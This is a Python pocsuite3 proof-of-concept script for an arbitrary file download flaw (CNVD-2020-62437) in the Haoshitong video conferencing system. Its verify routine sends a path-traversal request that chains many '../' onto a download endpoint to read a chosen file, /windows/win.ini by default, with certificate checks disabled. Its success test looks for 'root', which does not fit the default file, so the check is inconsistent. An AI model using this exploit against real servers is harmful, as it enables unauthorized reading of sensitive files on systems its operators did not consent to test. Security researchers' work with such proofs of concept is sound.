from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class DemoPOC(POCBase):
    vulID = '8'  
    name = '银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437'
    desc = '''银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437'''
    appPowerLink = '好视通视频会议系统 任意文件下载'
    appName = '银澎云计算 好视通视频会议系统'
    appVersion = '*'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString("/windows/win.ini", description='文件读取自定义命令')
        return o

    def _verify(self):
        result = {}
        target = self.url + "/register/toDownload.do?fileName=../../../../../../../../../../../../../.." + self.get_option("filename")
        try:
            r = requests.get(target, timeout=5,verify=False)
            if r.status_code == 200 and 'root' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['filename'] = self.get_option("filename")
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)